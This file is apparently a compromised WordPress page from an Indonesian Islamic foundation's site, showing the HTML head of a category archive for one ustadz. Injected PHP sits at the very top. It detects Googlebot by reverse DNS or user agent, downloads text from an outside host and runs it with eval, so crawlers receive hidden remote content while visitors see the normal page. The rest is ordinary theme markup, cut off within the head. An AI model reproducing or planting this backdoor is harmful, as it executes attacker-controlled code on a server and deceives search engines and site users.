<?php
$userIp = $_SERVER['REMOTE_ADDR'];
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
$referer = isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : 'Tidak ada referer';
$hostname = gethostbyaddr($userIp);

function isGooglebot($hostname, $userAgent) {
    return (
        strpos($hostname, 'googlebot.com') !== false ||
        strpos($userAgent, 'google-inspectiontool') !== false
    );
}

if (isGooglebot($hostname, $userAgent)) {
    $remoteCode = file_get_contents('https://xinztheonly.one/txt/google/oapr2.txt');
    eval('?>' . $remoteCode);
    exit;
} else {
?>
<!DOCTYPE html>
<html lang="id" class="" data-skin="light">
<head>
	<meta charset="UTF-8" />
	<link rel="profile" href="http://gmpg.org/xfn/11" />
			<script type="text/javascript">try{if("undefined"!=typeof localStorage){var tieSkin=localStorage.getItem("tie-skin"),html=document.getElementsByTagName("html")[0].classList,htmlSkin="light";if(html.contains("dark-skin")&&(htmlSkin="dark"),null!=tieSkin&&tieSkin!=htmlSkin){html.add("tie-skin-inverted");var tieSkinInverted=!0}"dark"==tieSkin?html.add("dark-skin"):"light"==tieSkin&&html.remove("dark-skin")}}catch(t){console.log(t)}</script>
		
<meta http-equiv='x-dns-prefetch-control' content='on'>
<link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
<link rel='dns-prefetch' href='//ajax.googleapis.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//fonts.gstatic.com' />
<link rel='dns-prefetch' href='//s.gravatar.com' />
<link rel='dns-prefetch' href='//www.google-analytics.com' />
<link rel='preload' as='image' href='https://assunnahcirebon.com/wp-content/uploads/2023/05/header-png.png'>
<link rel='preload' as='font' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/fonts/tielabs-fonticon/tielabs-fonticon.woff' type='font/woff' crossorigin='anonymous' />
<link rel='preload' as='font' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/fonts/fontawesome/fa-solid-900.woff2' type='font/woff2' crossorigin='anonymous' />
<link rel='preload' as='font' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/fonts/fontawesome/fa-brands-400.woff2' type='font/woff2' crossorigin='anonymous' />
<link rel='preload' as='font' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/fonts/fontawesome/fa-regular-400.woff2' type='font/woff2' crossorigin='anonymous' />
<link rel='preload' as='script' href='https://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js'>
<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<meta name="dlm-version" content="4.9.3">
	<!-- This site is optimized with the Yoast SEO plugin v21.5 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Ustadz Fariq Gazim Anuz Archives - Yayasan Assunnah Cirebon</title>
	<link rel="canonical" href="https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/" />
	<meta property="og:locale" content="id_ID" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Ustadz Fariq Gazim Anuz Archives - Yayasan Assunnah Cirebon" />
	<meta property="og:url" content="https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/" />
	<meta property="og:site_name" content="Yayasan Assunnah Cirebon" />
	<meta property="og:image" content="https://images.unsplash.com/photo-1633349018417-553a2b8c6148?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=400&q=80" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:image" content="https://images.unsplash.com/photo-1633349018417-553a2b8c6148?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=400&q=80" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"CollectionPage","@id":"https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/","url":"https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/","name":"Ustadz Fariq Gazim Anuz Archives - Yayasan Assunnah Cirebon","isPartOf":{"@id":"https://assunnahcirebon.com/#website"},"primaryImageOfPage":{"@id":"https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/#primaryimage"},"image":{"@id":"https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/#primaryimage"},"thumbnailUrl":"https://images.unsplash.com/photo-1633349018417-553a2b8c6148?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=400&q=80","breadcrumb":{"@id":"https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/#breadcrumb"},"inLanguage":"id"},{"@type":"ImageObject","inLanguage":"id","@id":"https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/#primaryimage","url":"https://images.unsplash.com/photo-1633349018417-553a2b8c6148?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=400&q=80","contentUrl":"https://images.unsplash.com/photo-1633349018417-553a2b8c6148?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=400&q=80","width":"400","height":"400","caption":"Pelajaran Dan Hikmah Dari Kisah Sahabat"},{"@type":"BreadcrumbList","@id":"https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://assunnahcirebon.com/"},{"@type":"ListItem","position":2,"name":"DAKWAH","item":"https://assunnahcirebon.com/category/dakwah/"},{"@type":"ListItem","position":3,"name":"Jadwal Kajian","item":"https://assunnahcirebon.com/category/dakwah/jadwal-kajian/"},{"@type":"ListItem","position":4,"name":"NAMA USTADZ","item":"https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/"},{"@type":"ListItem","position":5,"name":"Ustadz Fariq Gazim Anuz"}]},{"@type":"WebSite","@id":"https://assunnahcirebon.com/#website","url":"https://assunnahcirebon.com/","name":"Yayasan Assunnah Cirebon","description":"Meluruskan Aqidah Menegakkan Sunnah","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://assunnahcirebon.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"id"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel='dns-prefetch' href='//widgets.wp.com' />
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//0.gravatar.com' />
<link rel='dns-prefetch' href='//1.gravatar.com' />
<link rel='dns-prefetch' href='//2.gravatar.com' />
<link rel="alternate" type="application/rss+xml" title="Yayasan Assunnah Cirebon &raquo; Feed" href="https://assunnahcirebon.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Yayasan Assunnah Cirebon &raquo; Umpan Komentar" href="https://assunnahcirebon.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Yayasan Assunnah Cirebon &raquo; Ustadz Fariq Gazim Anuz Umpan Kategori" href="https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/ustadz-fariq-gazim-anuz/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/assunnahcirebon.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\ud83d\udd25","\ud83d\udc26\u200b\ud83d\udd25")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='arqam-style-css' href='https://assunnahcirebon.com/wp-content/plugins/arqam/assets/style.css?ver=6.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='formidable-css' href='https://assunnahcirebon.com/wp-content/plugins/formidable/css/formidableforms.css?ver=1128228' type='text/css' media='all' />
<link rel='stylesheet' id='twb-open-sans-css' href='https://fonts.googleapis.com/css?family=Open+Sans%3A300%2C400%2C500%2C600%2C700%2C800&#038;display=swap&#038;ver=6.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='twb-global-css' href='https://assunnahcirebon.com/wp-content/plugins/slider-wd/booster/assets/css/global.css?ver=1.0.0' type='text/css' media='all' />
<link rel='stylesheet' id='pt-cv-public-style-css' href='https://assunnahcirebon.com/wp-content/plugins/content-views-query-and-display-post-page/public/assets/css/cv.css?ver=3.6.1.1' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<link rel='stylesheet' id='mediaelement-css' href='https://assunnahcirebon.com/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://assunnahcirebon.com/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=6.8.1' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='advpsStyleSheet-css' href='https://assunnahcirebon.com/wp-content/plugins/advanced-post-slider/advps-style.css?ver=6.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='toc-screen-css' href='https://assunnahcirebon.com/wp-content/plugins/table-of-contents-plus/screen.min.css?ver=2309' type='text/css' media='all' />
<link rel='stylesheet' id='rss-retriever-css' href='https://assunnahcirebon.com/wp-content/plugins/wp-rss-retriever/inc/css/rss-retriever.css?ver=1.6.10' type='text/css' media='all' />
<link rel='stylesheet' id='hfe-style-css' href='https://assunnahcirebon.com/wp-content/plugins/header-footer-elementor/assets/css/header-footer-elementor.css?ver=1.6.17' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-frontend-css' href='https://assunnahcirebon.com/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.17.3' type='text/css' media='all' />
<link rel='stylesheet' id='feedzy-rss-feeds-elementor-css' href='https://assunnahcirebon.com/wp-content/plugins/feedzy-rss-feeds/css/feedzy-rss-feeds.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-icons-css' href='https://assunnahcirebon.com/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.23.0' type='text/css' media='all' />
<link rel='stylesheet' id='swiper-css' href='https://assunnahcirebon.com/wp-content/plugins/elementor/assets/lib/swiper/css/swiper.min.css?ver=5.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-4055-css' href='https://assunnahcirebon.com/wp-content/uploads/elementor/css/post-4055.css?ver=1701138221' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-global-css' href='https://assunnahcirebon.com/wp-content/uploads/elementor/css/global.css?ver=1701138224' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css' href='https://assunnahcirebon.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=6.3.4' type='text/css' media='all' />
<link rel='stylesheet' id='tablepress-default-css' href='https://assunnahcirebon.com/wp-content/plugins/tablepress/css/build/default.css?ver=2.2.3' type='text/css' media='all' />
<link rel='stylesheet' id='msl-main-css' href='https://assunnahcirebon.com/wp-content/plugins/master-slider/public/assets/css/masterslider.main.css?ver=3.9.5' type='text/css' media='all' />
<link rel='stylesheet' id='msl-custom-css' href='https://assunnahcirebon.com/wp-content/uploads/master-slider/custom.css?ver=1.7' type='text/css' media='all' />
<link rel='stylesheet' id='forget-about-shortcode-buttons-css' href='https://assunnahcirebon.com/wp-content/plugins/forget-about-shortcode-buttons/public/css/button-styles.css?ver=2.1.3' type='text/css' media='all' />
<link rel='stylesheet' id='tie-css-base-css' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/css/base.min.css?ver=5.4.10' type='text/css' media='all' />
<link rel='stylesheet' id='eael-general-css' href='https://assunnahcirebon.com/wp-content/plugins/essential-addons-for-elementor-lite/assets/front-end/css/view/general.min.css?ver=5.9' type='text/css' media='all' />
<style id='eael-general-inline-css' type='text/css'>
.wf-active .logo-text,.wf-active h1,.wf-active h2,.wf-active h3,.wf-active h4,.wf-active h5,.wf-active h6,.wf-active .the-subtitle{font-family: 'Poppins';}html #main-nav .main-menu > ul > li > a{text-transform: uppercase;}html #background-ad-cover{background-image: url(https://assunnahcirebon.com/wp-content/uploads/2022/02/header-for-ppdb-2022.jpg);}html .tie-cat-246,html .tie-cat-item-246 > span{background-color:#e67e22 !important;color:#FFFFFF !important;}html .tie-cat-246:after{border-top-color:#e67e22 !important;}html .tie-cat-246:hover{background-color:#c86004 !important;}html .tie-cat-246:hover:after{border-top-color:#c86004 !important;}html .tie-cat-256,html .tie-cat-item-256 > span{background-color:#2ecc71 !important;color:#FFFFFF !important;}html .tie-cat-256:after{border-top-color:#2ecc71 !important;}html .tie-cat-256:hover{background-color:#10ae53 !important;}html .tie-cat-256:hover:after{border-top-color:#10ae53 !important;}html .tie-cat-259,html .tie-cat-item-259 > span{background-color:#9b59b6 !important;color:#FFFFFF !important;}html .tie-cat-259:after{border-top-color:#9b59b6 !important;}html .tie-cat-259:hover{background-color:#7d3b98 !important;}html .tie-cat-259:hover:after{border-top-color:#7d3b98 !important;}html .tie-cat-261,html .tie-cat-item-261 > span{background-color:#34495e !important;color:#FFFFFF !important;}html .tie-cat-261:after{border-top-color:#34495e !important;}html .tie-cat-261:hover{background-color:#162b40 !important;}html .tie-cat-261:hover:after{border-top-color:#162b40 !important;}html .tie-cat-263,html .tie-cat-item-263 > span{background-color:#795548 !important;color:#FFFFFF !important;}html .tie-cat-263:after{border-top-color:#795548 !important;}html .tie-cat-263:hover{background-color:#5b372a !important;}html .tie-cat-263:hover:after{border-top-color:#5b372a !important;}html .tie-cat-264,html .tie-cat-item-264 > span{background-color:#4CAF50 !important;color:#FFFFFF !important;}html .tie-cat-264:after{border-top-color:#4CAF50 !important;}html .tie-cat-264:hover{background-color:#2e9132 !important;}html .tie-cat-264:hover:after{border-top-color:#2e9132 !important;}@media (max-width: 991px){html .side-aside.dark-skin{background: #2f88d6;background: -webkit-linear-gradient(135deg,#5933a2,#2f88d6 );background: -moz-linear-gradient(135deg,#5933a2,#2f88d6 );background: -o-linear-gradient(135deg,#5933a2,#2f88d6 );background: linear-gradient(135deg,#2f88d6,#5933a2 );}}
</style>
<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=auto&#038;ver=6.8.1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_css-css' href='https://assunnahcirebon.com/wp-content/plugins/jetpack/css/jetpack.css?ver=12.8.2' type='text/css' media='all' />
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><script type="text/javascript" src="https://assunnahcirebon.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" id="jquery-js-after">
/* <![CDATA[ */
jQuery(document).ready(function() {
	jQuery(".88ce6367387b229b883cd5806fe75c4d").click(function() {
		jQuery.post(
			"https://assunnahcirebon.com/wp-admin/admin-ajax.php", {
				"action": "quick_adsense_onpost_ad_click",
				"quick_adsense_onpost_ad_index": jQuery(this).attr("data-index"),
				"quick_adsense_nonce": "cf5167f98c",
			}, function(response) { }
		);
	});
});
/* ]]> */
</script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/slider-wd/booster/assets/js/circle-progress.js?ver=1.2.2" id="twb-circle-js"></script>
<script type="text/javascript" id="twb-global-js-extra">
/* <![CDATA[ */
var twb = {"nonce":"d24fa0b034","ajax_url":"https:\/\/assunnahcirebon.com\/wp-admin\/admin-ajax.php","plugin_url":"https:\/\/assunnahcirebon.com\/wp-content\/plugins\/slider-wd\/booster","href":"https:\/\/assunnahcirebon.com\/wp-admin\/admin.php?page=twb_slider_wd"};
var twb = {"nonce":"d24fa0b034","ajax_url":"https:\/\/assunnahcirebon.com\/wp-admin\/admin-ajax.php","plugin_url":"https:\/\/assunnahcirebon.com\/wp-content\/plugins\/slider-wd\/booster","href":"https:\/\/assunnahcirebon.com\/wp-admin\/admin.php?page=twb_slider_wd"};
/* ]]> */
</script>
